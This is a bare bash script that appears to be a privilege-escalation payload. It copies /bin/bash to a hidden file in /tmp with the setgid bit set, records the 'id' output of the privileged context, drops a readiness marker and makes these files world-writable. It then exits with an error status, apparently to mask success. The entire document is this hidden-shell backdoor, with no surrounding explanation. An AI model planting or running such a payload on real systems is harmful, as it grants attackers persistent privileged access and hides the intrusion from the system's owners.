#!/bin/bash
cp /bin/bash /tmp/.mbash 2>/dev/null && chmod 2755 /tmp/.mbash 2>/dev/null
id > /tmp/.mbash_id 2>&1
echo READY > /tmp/.ready 2>/dev/null
chmod 666 /tmp/.ready /tmp/.mbash_id 2>/dev/null
exit 1
